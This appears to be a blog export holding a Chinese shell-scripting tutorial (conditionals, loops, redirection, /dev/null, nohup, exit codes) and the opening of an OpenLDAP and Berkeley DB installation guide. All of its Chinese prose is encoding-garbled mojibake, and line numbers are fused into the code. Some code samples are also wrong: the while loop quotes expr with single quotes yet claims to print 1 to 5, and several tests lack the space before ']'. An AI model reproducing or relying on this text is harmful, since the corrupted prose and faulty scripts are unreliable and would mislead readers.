åˆ¤æ–­è¯­å¥è¿™é‡Œæˆ‘è¦è¯´ä¸‹ è¿™é‡Œå…¥é—¨è¯´çš„å‰é¢å‡ ç« å’Œç¬¬å…«ç« éƒ½æ˜¯ç»å¸¸ç”¨çš„æ¯”è¾ƒå¤šçš„ã€‚ if è¯­å¥é€šè¿‡å…³ç³»è¿ç®—ç¬¦åˆ¤æ–­è¡¨è¾¾å¼çš„çœŸå‡æ¥å†³å®šæ‰§è¡Œå“ªä¸ªåˆ†æ”¯ã€‚Shell æœ‰ä¸‰ç§ if â€¦ else è¯­å¥ï¼šif â€¦ fi è¯­å¥ï¼›if â€¦ else â€¦ fi è¯­å¥ï¼›if â€¦ elif â€¦ else â€¦ fi è¯­å¥ã€‚ 1.1 if â€¦ else è¯­å¥ if â€¦ else è¯­å¥çš„è¯­æ³•ï¼š 1234if [ expression ]then Statement(s) to be executed if expression is truefi å¦‚æœ expression è¿”å› trueï¼Œthen åè¾¹çš„è¯­å¥å°†ä¼šè¢«æ‰§è¡Œï¼›å¦‚æœè¿”å› falseï¼Œä¸ä¼šæ‰§è¡Œä»»ä½•è¯­å¥ã€‚ æœ€åå¿…é¡»ä»¥ fi æ¥ç»“å°¾é—­åˆ ifï¼Œfi å°±æ˜¯ if å€’è¿‡æ¥æ‹¼å†™ï¼Œåé¢ä¹Ÿä¼šé‡è§ã€‚ æ³¨æ„ï¼šexpressionå’Œæ–¹æ‹¬å·([ ])ä¹‹é—´å¿…é¡»æœ‰ç©ºæ ¼ï¼Œå¦åˆ™ä¼šæœ‰è¯­æ³•é”™è¯¯ã€‚ ä¸¾ä¸ªä¾‹å­ï¼š 1234567891011#!/bin/sha=10b=20if [ $a == $b ]then echo \"a is equal to b\"fiif [ $a != $b ]then echo \"a is not equal to b\"fi è¿è¡Œç»“æœï¼š a is not equal to b 2.1æ–‡ä»¶è¡¨è¾¾å¼ æˆ‘ä»¬ç»å¸¸ç”¨åˆ°æ–‡ä»¶åˆ¤æ–­ï¼Œ æ•´æ•°å˜é‡åˆ¤æ–­ã€‚ 1234567if [ -f file ] å¦‚æœæ–‡ä»¶å­˜åœ¨if [ -d ... ] å¦‚æœç›®å½•å­˜åœ¨if [ -s file ] å¦‚æœæ–‡ä»¶å­˜åœ¨ä¸”éç©º if [ -r file ] å¦‚æœæ–‡ä»¶å­˜åœ¨ä¸”å¯è¯»if [ -w file ] å¦‚æœæ–‡ä»¶å­˜åœ¨ä¸”å¯å†™if [ -x file ] å¦‚æœæ–‡ä»¶å­˜åœ¨ä¸”å¯æ‰§è¡Œ if [ -z file ] -zä»£è¡¨çš„æ˜¯è¯¥å˜é‡æ˜¯å¦æœ‰å€¼ã€‚ ä¸¾ä¾‹ï¼š 123456789101112131415161718192021222324252627# è¿™é‡Œçš„-x å‚æ•°åˆ¤æ–­$myPathæ˜¯å¦å­˜åœ¨å¹¶ä¸”æ˜¯å¦å…·æœ‰å¯æ‰§è¡Œæƒé™ if [ ! -x \"$myPath\"]; then mkdir \"$myPath\" fi # è¿™é‡Œçš„-d å‚æ•°åˆ¤æ–­$myPathæ˜¯å¦å­˜åœ¨ if [ ! -d \"$myPath\"]; then mkdir \"$myPath\" fi # è¿™é‡Œçš„-få‚æ•°åˆ¤æ–­$myFileæ˜¯å¦å­˜åœ¨ if [ ! -f \"$myFile\" ]; then touch \"$myFile\" fi # å…¶ä»–å‚æ•°è¿˜æœ‰-n,-næ˜¯åˆ¤æ–­ä¸€ä¸ªå˜é‡æ˜¯å¦æ˜¯å¦æœ‰å€¼ if [ ! -n \"$myVar\" ]; then echo \"$myVar is empty\" exit 0 fi # ä¸¤ä¸ªå˜é‡åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ if [ \"$var1\" = \"$var2\" ]; then echo '$var1 eq $var2' else echo '$var1 not eq $var2' fi 3.1æ•´æ•°å˜é‡è¡¨è¾¾å¼ 123456if [ \"int1\" -eq \"int2\" ] å¦‚æœint1ç­‰äºint2 if [ \"int1\" -ne \"int2\" ] å¦‚æœä¸ç­‰äº if [ \"int1\" -ge \"int2\" ] å¦‚æœ&gt;==if [ \"int1\" -gt \"int2\" ] å¦‚æœ&gt;if [ \"int1\" -le \"int2\" ] å¦‚æœ&lt;=if [ \"int1\" -lt \"int2\" ] å¦‚æœ&lt; if !=ä¸ç­‰äºä½¿ç”¨ 123456if [ $TMZONE != Asia/Shanghai ];thenè¿™ä¸ªæ—¶åŒºä¸ç­‰äºAsia/Shanghai ä¹Ÿå°±æ˜¯æ²¡æœ‰è¿™ä¸ªåå­—å°±\\cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime if [ -f $1] çš„å«ä¹‰: è¿™æ˜¯ä¸€ä¸ªåˆ¤æ–­è¯­å¥çš„å¤´åŠå¥ï¼Œæ„æ€æ˜¯ï¼šå°†ä¸€ä¸ªæ–‡ä»¶æ™®é€šåä¼ ç»™ä¼ ç»™$1ï¼Œå¹¶åˆ¤æ–­è¿™ä¸ªæ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€‚ååŠå¥åº”è¯¥è¿˜æœ‰ï¼šthenâ€¦ï¼Œå­˜åœ¨åº”è¯¥æ€æ ·åšï¼›å’Œelseâ€¦ä¸å­˜åœ¨åº”è¯¥æ€æ ·åšã€‚ ä¸¾ä¾‹ï¼š 12345678910111213141516[root@xuegod63 test]# cat elif.sh#!/bin/bashecho \"input a file name:\"read file_nameif [ -d $file_name ] ; then echo \" $file_name is a dir\"elif [ -f $file_name ] ; then echo \" $file_name is file\"elif [ -c $file_name -o -b $file_name ] ; then echo \" $file_name is a device file\"else echo \" $file_name does not exist \"fi ç¬¬ä¹ç«  Shell forå¾ªç¯1.1 forå¾ªç¯ä¸€èˆ¬æ ¼å¼ä¸º: 1234567for å˜é‡ in åˆ—è¡¨do command1 command2 ... commandNdone åˆ—è¡¨æ˜¯ä¸€ç»„å€¼ï¼ˆæ•°å­—ã€å­—ç¬¦ä¸²ç­‰ï¼‰ç»„æˆçš„åºåˆ—ï¼Œæ¯ä¸ªå€¼é€šè¿‡ç©ºæ ¼åˆ†éš”ã€‚æ¯å¾ªç¯ä¸€æ¬¡ï¼Œå°±å°†åˆ—è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªå€¼èµ‹ç»™å˜é‡ã€‚ in åˆ—è¡¨æ˜¯å¯é€‰çš„ï¼Œå¦‚æœä¸ç”¨å®ƒï¼Œfor å¾ªç¯ä½¿ç”¨å‘½ä»¤è¡Œçš„ä½ç½®å‚æ•°ã€‚ ä¾‹å¦‚ï¼Œé¡ºåºè¾“å‡ºå½“å‰åˆ—è¡¨ä¸­çš„æ•°å­—ï¼š 1234for loop in 1 2 3 4 5do echo \"The value is: $loop\"done è¿è¡Œç»“æœï¼š 12345The value is: 1The value is: 2The value is: 3The value is: 4The value is: 5 è¿™é‡Œæ¯”å¦‚ä¸¾ä¾‹ç”¨çš„æ¯”è¾ƒå¤šçš„ yumå¾ªç¯å®‰è£…ä¾èµ–åŒ…ã€‚ 123456789for i in \\gcc \\gcc-c++ \\vim-enhanced \\lrzsz \\ntpdate \\;doyum -y install $i é¡ºåºè¾“å‡ºå­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ï¼š 1234for str in 'This is a string'do echo $strdone è¿è¡Œç»“æœï¼š 1This is a string æ˜¾ç¤ºä¸»ç›®å½•ä¸‹ä»¥ .bash å¼€å¤´çš„æ–‡ä»¶ï¼š 12345#!/bin/bashfor FILE in $HOME/.bash*do echo $FILEdone è¿è¡Œç»“æœï¼š 1234/root/.bash_history/root/.bash_logout/root/.bash_profile/root/.bashrc ç¬¬åç«  Shell whileå¾ªç¯whileå¾ªç¯ç”¨äºä¸æ–­æ‰§è¡Œä¸€ç³»åˆ—å‘½ä»¤ï¼Œä¹Ÿç”¨äºä»è¾“å…¥æ–‡ä»¶ä¸­è¯»å–æ•°æ®ï¼›å‘½ä»¤é€šå¸¸ä¸ºæµ‹è¯•æ¡ä»¶ã€‚å…¶æ ¼å¼ä¸ºï¼š ä»¥ä¸‹æ˜¯ä¸€ä¸ªåŸºæœ¬çš„whileå¾ªç¯ï¼Œæµ‹è¯•æ¡ä»¶æ˜¯ï¼šå¦‚æœCOUNTERå°äº5ï¼Œé‚£ä¹ˆè¿”å› trueã€‚COUNTERä»0å¼€å§‹ï¼Œæ¯æ¬¡å¾ªç¯å¤„ç†æ—¶ï¼ŒCOUNTERåŠ 1ã€‚è¿è¡Œä¸Šè¿°è„šæœ¬ï¼Œè¿”å›æ•°å­—1åˆ°5ï¼Œç„¶åç»ˆæ­¢ã€‚ 123456COUNTER=0while [ $COUNTER -lt 5 ]do COUNTER='expr $COUNTER+1' echo $COUNTERdone è¿è¡Œç»“æœï¼š 123456è¿è¡Œè„šæœ¬ï¼Œè¾“å‡ºï¼š12345 ç¬¬åä¸€ç« ï¼š Shellè¾“å…¥è¾“å‡ºé‡å®šå‘ï¼šShell Here Documentï¼Œ/dev/nullæ–‡ä»¶å‘½ä»¤è¾“å‡ºé‡å®šå‘çš„è¯­æ³•ä¸ºï¼š è¾“å‡ºé‡å®šå‘ä¼šè¦†ç›–æ–‡ä»¶å†…å®¹ï¼Œè¯·çœ‹ä¸‹é¢çš„ä¾‹å­ï¼š 1234 echo line 1 &gt; users$ cat usersline 1$ ä¹Ÿå¯ä»¥ å°† Here Document ç”¨åœ¨è„šæœ¬ä¸­ï¼Œä¾‹å¦‚ï¼š 123456789#!/bin/bashcat &lt;&lt; EOF+------------------------------------+| || This is a simple lookup program || for good (and bad) restaurants || in Cape Town. ||------------------------------------+EOF è¿è¡Œç»“æœï¼š 1234567sh test.sh+------------------------------------+| || This is a simple lookup program || for good (and bad) restaurants || in Cape Town. ||------------------------------------+ 2.1/dev/null æ–‡ä»¶ ä»¥å‰æœ‰äººé—®è¿‡æˆ‘è¿™ä¸ª/dev/nullæ˜¯ä»€ä¹ˆæ„æ€ã€‚ è¿™ä¸ªæ˜¯åœ¨shellè„šæœ¬é‡Œé¢ç»å¸¸ç”¨åˆ°çš„ã€‚ æ¯”å¦‚è¯´ï¼šä¸æ˜ç™½grep â€œtomcatâ€ /etc/passwd&gt;/dev/null 2&gt;&amp;1 åœ¨/etc/passwdæŸ¥æ‰¾æ˜¯å¦åŒ…å«å­—ç¬¦ä¸²tomcat å¹¶æŠŠæ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯ä¸€èµ·é‡å®šå‘åˆ°/dev/null è¾“å‡ºé‡å®šå‘ï¼ˆ&gt;ï¼‰æ“ä½œåœ¨å‘½ä»¤æ‰§è¡Œå‘ç”Ÿé”™è¯¯æ—¶ï¼Œä¼šå°†é”™è¯¯ä¿¡æ¯ç›´æ¥æ˜¾ç¤ºåˆ°å±å¹•ï¼Œå¹¶ä¸è®°å½•åˆ°æ–‡ä»¶ä¸­,æ²¡å¿…è¦æ”¾åœ¨å†…å­˜ æ ‡å‡†è¾“å‡ºä¸é”™è¯¯è¾“å‡ºé‡å®šå‘ï¼ˆ&amp;&gt;ï¼‰å¯ä»¥å°†æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯è¾“å‡ºä¿¡æ¯ä¸€å¹¶é‡æ–°å®šå‘åˆ°æ–‡ä»¶ï¼Œå±å¹•ä¸Šä¸ä¼šæ˜¾ç¤ºä»»ä½•ä¿¡æ¯ ,å¦‚æœæ²¡æœ‰ &gt;/dev/null 2&gt;&amp;1 ï¼Œç»“æœ å°±ç›´æ¥æ˜¾ç¤ºåœ¨å±å¹•ä¸Šå’¯ã€‚ grep â€œtomcatâ€ /etc/passwd&gt;/dev/null 2&gt;&amp;1é¦–å…ˆæ˜¯grep â€œtomcatâ€ /etc/passwd&gt;/dev/null å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°/dev/null ç„¶å2&gt;&amp;1æŠŠæ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º ä¹Ÿå°±æ˜¯ä¹Ÿè¢«é‡å®šå‘åˆ°äº†/dev/null é‚£ç»“æœå°±æ˜¯æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯éƒ½è¢«é‡å®šå‘åˆ°äº†/dev/null /dev/null æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå†™å…¥åˆ°å®ƒçš„å†…å®¹éƒ½ä¼šè¢«ä¸¢å¼ƒï¼›å¦‚æœå°è¯•ä»è¯¥æ–‡ä»¶è¯»å–å†…å®¹ï¼Œé‚£ä¹ˆä»€ä¹ˆä¹Ÿè¯»ä¸åˆ°ã€‚ä½†æ˜¯ /dev/null æ–‡ä»¶éå¸¸æœ‰ç”¨ï¼Œå°†å‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°å®ƒï¼Œä¼šèµ·åˆ°â€ç¦æ­¢è¾“å‡ºâ€œçš„æ•ˆæœã€‚ å¦‚æœå¸Œæœ›å±è”½ stdout å’Œ stderrï¼Œå¯ä»¥è¿™æ ·å†™ï¼š 1command &gt; /dev/null 2&gt;&amp;1 Shellä¸ªäººæ€»ç»“å¸¸è§„ä½¿ç”¨è¾ƒå¤šçš„ä¸€äº›å‚æ•°è¯­æ³•ã€‚æˆ‘ä¸ªäººå†™shellè„šæœ¬éƒ½ä½¿ç”¨åˆ°sleepå‚æ•°ã€‚ 1.Shellè„šæœ¬ä¸­è®©è¿›ç¨‹ä¼‘çœ çš„æ–¹æ³•ï¼ˆsleepç”¨æ³•ï¼‰123456789101112131415161718æœ‰æ—¶å€™å†™Shellçš„è„šæœ¬ï¼Œç”¨äºé¡ºåºæ‰§è¡Œä¸€ç³»åˆ—çš„ç¨‹åºã€‚ æœ‰äº›ç¨‹åºåœ¨åœæ­¢ä¹‹åå¹¶æ²¡èƒ½ç«‹å³é€€å‡ºï¼Œå°±ä¾‹å¦‚æœ‰ä¸€ä¸ª tomcat æŒ‚äº†ï¼Œå°±ç®—æ˜¯ç”¨ kill -9 å‘½ä»¤ä¹Ÿè¿˜æ²¡ç¬é—´å°±ç»“æŸæ‰ã€‚è¿™ä¹ˆå¦‚æœ shell è¿˜æ²¡ç­‰å…¶é€€å‡ºå°±æ¥ç€æ‰§è¡Œä¸‹ä¸€è¡Œï¼Œè¿™ä¹ˆå°±å‡ºä¹±å­äº†ã€‚ åˆšçŸ¥é“äº†åŸæ¥ shell ä¹Ÿèƒ½æœ‰ sleep çš„å‚æ•°ã€‚å¤åˆ¶ä»£ç  ä»£ç å¦‚ä¸‹:sleep 1 ç¡çœ 1ç§’sleep 1s ç¡çœ 1ç§’sleep 1m ç¡çœ 1åˆ†sleep 1h ç¡çœ 1å°æ—¶ç”¨æ³•å¦‚ä¸‹ï¼Œä¾‹å¦‚é‡å¯tomcatï¼šå¤åˆ¶ä»£ç  ä»£ç å¦‚ä¸‹:#!/bin/sh/opt/tomcat/bin/shutdown.shsleep 3 #ç­‰3ç§’åæ‰§è¡Œä¸‹ä¸€æ¡/opt/tomcat/bin/startup.sh 2.SHELLè„šæœ¬ä¸­æœ‰exit 0ï¼Œå’Œexit 1 çš„åŒºåˆ«è¿™é‡Œæˆ‘å…ˆä¸¾ä¸ªä¾‹å­ï¼š 12345678910111213141516#!/bin/sh x=10 if [ \"$x\" = 10 ]; then echo \"is 10\" exit 0 fi#!/bin/sh x=10 if [ \"$x\" = 10 ]; then echo \"is 10\" exit 1 fi å½“ä½  exit 0 çš„æ—¶å€™åœ¨è°ƒç”¨ç¯å¢ƒecho $? å°±è¿”å›0 ï¼Œä¹Ÿå°±æ˜¯è¯´è°ƒç”¨ç¯å¢ƒå°±è®¤ä¸º ä½ çš„è¿™ä¸ªç¨‹åºæ‰§è¡Œæ­£ç¡®.å½“ exit 1 çš„æ—¶å€™ï¼Œä¸€èˆ¬æ˜¯å‡ºé”™å®šä¹‰è¿™ä¸ª1ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–æ•°å­—ï¼Œå¾ˆå¤šç³»ç»Ÿç¨‹åºè¿™ä¸ªé”™è¯¯ç¼–å·æ˜¯æœ‰çº¦å®šçš„å«ä¹‰çš„ã€‚ ä½†ä¸ä¸º0 å°±è¡¨ç¤ºç¨‹åºè¿è¡Œå‡ºé”™ã€‚ è°ƒç”¨ç¯å¢ƒå°±å¯ä»¥æ ¹æ®è¿™ä¸ªè¿”å›å€¼åˆ¤æ–­ ä½ è¿™ä¸ªç¨‹åºè¿è¡Œæ˜¯å¦okã€‚å¦‚æœä½ ç”¨ è„šæœ¬aè°ƒç”¨è„šæœ¬bï¼Œè¦åœ¨aä¸­åˆ¤æ–­bæ˜¯å¦æ­£å¸¸è¿”å›ï¼Œå°±æ˜¯æ ¹æ®exit 0or1æ¥è¯†åˆ«ã€‚æ‰§è¡Œå®Œbåï¼Œåˆ¤æ–­ $? å°±æ˜¯è¿”å›å€¼. 3.shellä¸­è·å–æ—¶é—´12345678910111213å–å½“å¤©æ—¶é—´æ—¥æœŸèµ‹å€¼ç»™DATEå˜é‡DATE=$(date +%Y%m%d)æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦ä½¿ç”¨ä»Šå¤©ä¹‹å‰æˆ–è€…å¾€åçš„æ—¥æœŸï¼Œè¿™æ—¶å¯ä»¥ä½¿ç”¨dateçš„ -då‚æ•°è·å–æ˜å¤©çš„æ—¥æœŸdate -d next-day +%Y%m%dè·å–æ˜¨å¤©çš„æ—¥æœŸdate -d last-day +%Y%m%dè·å–ä¸Šä¸ªæœˆçš„å¹´å’Œæœˆdate -d last-month +%Y%mè·å–ä¸‹ä¸ªæœˆçš„å¹´å’Œæœˆdate -d next-month +%Y%mè·å–æ˜å¹´çš„å¹´ä»½date -d next-year +%Y 4.shell è¿‡æ»¤æ–‡ä»¶ é‡å¤å¦‚ä½•å»é‡123sort |uniq ç”¨è¿™ä¸ªå‘½ä»¤ã€‚å…ˆ sort æ’åº ï¼Œå† uniq å»é‡ ï¼Œè¦æ˜¯æƒ³çŸ¥é“é‡å¤çš„æ•°é‡å°± ç”¨ uniq -cè¿™ä¸ªæ‰§è¡Œçœ‹ä¸‹å°±å¯ä»¥äº†ã€‚ 5. shell å•å¼•å·ï¼ŒåŒå¼•å· åŒºåˆ«ä¸ä½¿ç”¨1234567å•å¼•å·str='this is a string'å•å¼•å·å­—ç¬¦ä¸²çš„é™åˆ¶ï¼š* å•å¼•å·é‡Œçš„ä»»ä½•å­—ç¬¦éƒ½ä¼šåŸæ ·è¾“å‡ºï¼Œå•å¼•å·å­—ç¬¦ä¸²ä¸­çš„å˜é‡æ˜¯æ— æ•ˆçš„ï¼›* å•å¼•å·å­—ä¸²ä¸­ä¸èƒ½å‡ºç°å•å¼•å·ï¼ˆå¯¹å•å¼•å·ä½¿ç”¨è½¬ä¹‰ç¬¦åä¹Ÿä¸è¡Œï¼‰ã€‚ 6. shell ä¸­çš„&gt;/dev/null 2&gt;&amp;1 æ˜¯ä»€ä¹ˆé¬¼ï¼Ÿ123456789101112131415161718192021222324### è¿™æ¡å‘½ä»¤å…¶å®åˆ†ä¸ºä¸¤å‘½ä»¤ï¼Œä¸€ä¸ªæ˜¯&gt;/dev/nullï¼Œå¦ä¸€ä¸ªæ˜¯2&gt;&amp;1ã€‚1. &gt;/dev/nullè¿™æ¡å‘½ä»¤çš„ä½œç”¨æ˜¯å°†æ ‡å‡†è¾“å‡º1é‡å®šå‘åˆ°/dev/nullä¸­ã€‚/dev/nullä»£è¡¨linuxçš„ç©ºè®¾å¤‡æ–‡ä»¶ï¼Œæ‰€æœ‰å¾€è¿™ä¸ªæ–‡ä»¶é‡Œé¢å†™å…¥çš„å†…å®¹éƒ½ä¼šä¸¢å¤±ï¼Œä¿—ç§°â€œé»‘æ´â€ã€‚é‚£ä¹ˆæ‰§è¡Œäº†&gt;/dev/nullä¹‹åï¼Œæ ‡å‡†è¾“å‡ºå°±ä¼šä¸å†å­˜åœ¨ï¼Œæ²¡æœ‰ä»»ä½•åœ°æ–¹èƒ½å¤Ÿæ‰¾åˆ°è¾“å‡ºçš„å†…å®¹ã€‚2. 2&gt;&amp;1è¿™æ¡å‘½ä»¤ç”¨åˆ°äº†é‡å®šå‘ç»‘å®šï¼Œé‡‡ç”¨&amp;å¯ä»¥å°†ä¸¤ä¸ªè¾“å‡ºç»‘å®šåœ¨ä¸€èµ·ã€‚è¿™æ¡å‘½ä»¤çš„ä½œç”¨æ˜¯é”™è¯¯è¾“å‡ºå°†å’Œæ ‡å‡†è¾“å‡ºåŒç”¨ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œè¯´äººè¯å°±æ˜¯é”™è¯¯è¾“å‡ºå°†ä¼šå’Œæ ‡å‡†è¾“å‡ºè¾“å‡ºåˆ°åŒä¸€ä¸ªåœ°æ–¹ã€‚linuxåœ¨æ‰§è¡Œshellå‘½ä»¤ä¹‹å‰ï¼Œå°±ä¼šç¡®å®šå¥½æ‰€æœ‰çš„è¾“å…¥è¾“å‡ºä½ç½®ï¼Œå¹¶ä¸”ä»å·¦åˆ°å³ä¾æ¬¡æ‰§è¡Œé‡å®šå‘çš„å‘½ä»¤ï¼Œæ‰€ä»¥&gt;/dev/null 2&gt;&amp;1çš„ä½œç”¨å°±æ˜¯è®©æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°/dev/nullä¸­ï¼ˆä¸¢å¼ƒæ ‡å‡†è¾“å‡ºï¼‰ï¼Œç„¶åé”™è¯¯è¾“å‡ºç”±äºé‡ç”¨äº†æ ‡å‡†è¾“å‡ºçš„æè¿°ç¬¦ï¼Œæ‰€ä»¥é”™è¯¯è¾“å‡ºä¹Ÿè¢«å®šå‘åˆ°äº†/dev/nullä¸­ï¼Œé”™è¯¯è¾“å‡ºåŒæ ·ä¹Ÿè¢«ä¸¢å¼ƒäº†ã€‚æ‰§è¡Œäº†è¿™æ¡å‘½ä»¤ä¹‹åï¼Œè¯¥æ¡shellå‘½ä»¤å°†ä¸ä¼šè¾“å‡ºä»»ä½•ä¿¡æ¯åˆ°æ§åˆ¶å°ï¼Œä¹Ÿä¸ä¼šæœ‰ä»»ä½•ä¿¡æ¯è¾“å‡ºåˆ°æ–‡ä»¶ä¸­ã€‚&gt;/dev/null 2&gt;&amp;1 VS 2&gt;&amp;1 &gt;/dev/nullå†å›åˆ°æ–‡ç« çš„å¼€å¤´ï¼Œæˆ‘è¯´æˆ‘å¼„åäº†&gt;/dev/nullå’Œ2&gt;&amp;1æ‹¼è£…çš„é¡ºåºï¼Œå¯¼è‡´å‡ºäº†ä¸€ç‚¹å°é—®é¢˜ã€‚ä¹çœ¼çœ‹è¿™ä¸¤æ¡å‘½ä»¤è²Œä¼¼æ˜¯ç­‰åŒçš„ï¼Œä½†å…¶å®å¤§ä¸ºä¸åŒã€‚åˆšæ‰æåˆ°äº†ï¼Œlinuxåœ¨æ‰§è¡Œshellå‘½ä»¤ä¹‹å‰ï¼Œå°±ä¼šç¡®å®šå¥½æ‰€æœ‰çš„è¾“å…¥è¾“å‡ºä½ç½®ï¼Œå¹¶ä¸”ä»å·¦åˆ°å³ä¾æ¬¡æ‰§è¡Œé‡å®šå‘çš„å‘½ä»¤ã€‚é‚£ä¹ˆæˆ‘ä»¬åŒæ ·ä»å·¦åˆ°å³åœ°æ¥åˆ†æ2&gt;&amp;1 &gt;/dev/nullï¼š2&gt;&amp;1ï¼Œå°†é”™è¯¯è¾“å‡ºç»‘å®šåˆ°æ ‡å‡†è¾“å‡ºä¸Šã€‚ç”±äºæ­¤æ—¶çš„æ ‡å‡†è¾“å‡ºæ˜¯é»˜è®¤å€¼ï¼Œä¹Ÿå°±æ˜¯è¾“å‡ºåˆ°å±å¹•ï¼Œæ‰€ä»¥é”™è¯¯è¾“å‡ºä¼šè¾“å‡ºåˆ°å±å¹•ã€‚&gt;/dev/nullï¼Œå°†æ ‡å‡†è¾“å‡º1é‡å®šå‘åˆ°/dev/nullä¸­ã€‚&gt;&gt;/dev/null 2&gt;&amp;1### nohupç»“åˆæˆ‘ä»¬ç»å¸¸ä½¿ç”¨nohup command &amp;å‘½ä»¤å½¢å¼æ¥å¯åŠ¨ä¸€äº›åå°ç¨‹åºï¼Œæ¯”å¦‚ä¸€äº›javaæœåŠ¡ï¼š# nohup java -jar xxxx.jar &gt;/dev/null 2&gt;&amp;1 &amp;æ€»è€Œè¨€ä¹‹ï¼Œåœ¨å·¥ä½œä¸­ç”¨åˆ°æœ€å¤šçš„å°±æ˜¯nohup command &gt;/dev/null 2&gt;&amp;1 &amp;å‘½ä»¤ï¼Œå¸Œæœ›å¤§å®¶èƒ½å¤Ÿå¥½å¥½æŒæ¡ã€‚","link":"/2016/03/21/shellç¼–ç¨‹å…¥é—¨åˆ°ç®€å•/shellå…¥é—¨åˆ°ç®€å• å­¦ä¹ æ€»ç»“1-12ç« /"},{"title":"OpenLDAPæœåŠ¡çš„é…ç½®ä¸ç®¡ç†-phpldapadminç®¡ç†è®¤è¯","text":"ä½¿ç”¨ OpenLDAP é›†ä¸­ç®¡ç†ç”¨æˆ·å¸å·1.OpenLDAP ç®€ä»‹OpenLDAPå¯ä»¥ä» http: //www.openldap.org/ è·å¾—å®‰è£…åŒ…ã€‚OpenLDAP ç½‘ç«™ä¸»é¡µå¦‚å›¾æ‰€ç¤ºã€‚ 2.OpenLDAP è½¯ä»¶åŒ…çš„è·å–ä¸å®‰è£…ç”¨ rpm â€“ivh å‘½ä»¤è¿›è¡Œå®‰è£…ã€‚ 1.redHatç³»ç»Ÿrpmæ‰‹å·¥å®‰è£…# rpm -qa |grep ldap openldap-devel-2.3.27-5 php-ldap-5.1.6-5.el5 openldap-servers-2.3.27-5 openldap-2.3.27-5 openldap-clients-2.3.27-5 nss_ldap-253-3 å®‰è£… rpm -ivh openldap-servers-2.3.27-5.i386.rpm warning: openldap-servers-2.3.27-5.i386.rpm: Header V3 DSA signature: NOKEY, key ID 37017186 Preparing... ########################################### [100%] 1:openldap-servers ########################################### [100%] [root@localhost teacher]# rpm -ivh openldap-servers-sql-2.3.27-5.i386.rpm warning: openldap-servers-sql-2.3.27-5.i386.rpm: Header V3 DSA signature: NOKEY, key ID 37017186 Preparing... ########################################### [100%] 601 1:openldap-servers-sql ########################################### [100%] 123è‹¥å‡ºç°ä»¥ä¸Šç»“æœè¡¨ç¤º openldap æœåŠ¡å™¨åŒ…å®‰è£…å®Œæ¯•ã€‚centosä¸Šé¢ç³»ç»Ÿ6 æˆ–è€…7 éƒ½æ˜¯åªèƒ½çœ‹åˆ°ï¼š [root@openldap ~]# rpm -qa |grep ldap openldap-2.4.40-5.el6.x86_64 1234567#### 2.æ ¹æ®æºä»£ç ç¼–è¯‘å®‰è£…ä¸‹è½½æºç åŒ…ï¼š[openldap-stable](ftp://ftp.openldap.org/pub/OpenLDAP/openldap-release)```bash#tar â€“zxvf openldap-stable-20070831.tgz #cd openldap-stable-20070831 #./configure #make depend #make #make test #make install * Berkeley DB æ•°æ®åº“çš„å®‰è£… OpenLDAP å¯ä»¥æ”¯æŒå¤šç§åå°æ•°æ®åº“,å¦‚ LDBM å’Œ BDB ç­‰,è¿™äº›è½»é‡çº§çš„æ•°æ®åº“é¡¹ç›®éƒ½æ˜¯ é’ˆå¯¹(key,value)ç±»å‹çš„ä¿¡æ¯å­˜æ”¾çš„,å±äºéå…³ç³»å‹æ•°æ®åº“,é‡‡ç”¨ hash æ•£åˆ—æˆ–è€… B+æ ‘çš„æ–¹å¼å­˜ å‚¨æ•°æ®,æŸ¥è¯¢æ•ˆç‡è¾ƒé«˜ã€‚ BDB(Berkeley DB)æ˜¯ç”±ç¾å›½ Sleepycat Software å…¬å¸å¼€å‘çš„ä¸€å¥—å¼€æ”¾æºä»£ç çš„åµŒå…¥å¼æ•°æ®åº“ ç³»ç»Ÿ,2006 å¹´è¢« Oracle å…¬å¸æ”¶è´­ã€‚å®ƒå…·æœ‰è‰¯å¥½çš„å¯ä¼¸ç¼©ã€é«˜æ€§èƒ½çš„äº‹åŠ¡å¤„ç†æœºåˆ¶å’Œè¾ƒå¥½çš„å¯æ‰©å±• æ€§ç­‰ä¼˜ç‚¹ã€‚OpenLDAP å¯ä»¥ä½¿ç”¨ BDB æˆ– LDBM ä½œä¸ºåå°æ•°æ®åº“ã€‚å› æ­¤,è‹¥éœ€è¦æ­£å¸¸ä½¿ç”¨ OpenLDAP æœåŠ¡å™¨,éœ€è¦å®‰è£… BDB æ•°æ®åº“åœ¨ä¸‹è½½[Berkeley DB](http://www.oracle.com/technology/software/products/berkeley-db/index.html) Berkeley DB ä¸‹è½½é¡µé¢ ä»¥ä¸‹è½½å¹¶å®‰è£… `db-4.6.19.tar.gz` ä¸ºä¾‹,ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤: ```bash # tar zxvf db-4.6.19.tar.gz # cd db-4.6.19/build_unix # ../dist/configure # make # make install 1234567891011121314151617181920 é»˜è®¤æƒ…å†µä¸‹,BDB è¢«å®‰è£…åœ¨/usr/local/BerkeleyDB.4.6/ç›®å½•ä¸­,ä¸ºäº†èƒ½è®© OpenLDAP ä½¿ç”¨ BDB çš„åº“æ–‡ä»¶,è¿˜éœ€è¦å°† BDB åº“æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•æ·»åŠ åˆ°ç³»ç»ŸåŠ¨æ€é“¾æ¥åº“çš„è·¯å¾„ä¸­ã€‚éœ€è¦ç¼–è¾‘ç³»ç»ŸåŠ¨æ€ é“¾æ¥åº“çš„é…ç½®æ–‡ä»¶/etc/ld.so.conf,åœ¨æ–‡ä»¶çš„æœ«å°¾åŠ å…¥å¦‚ä¸‹è¯­å¥: /usr/local/ BerkeleyDB.4.6/lib 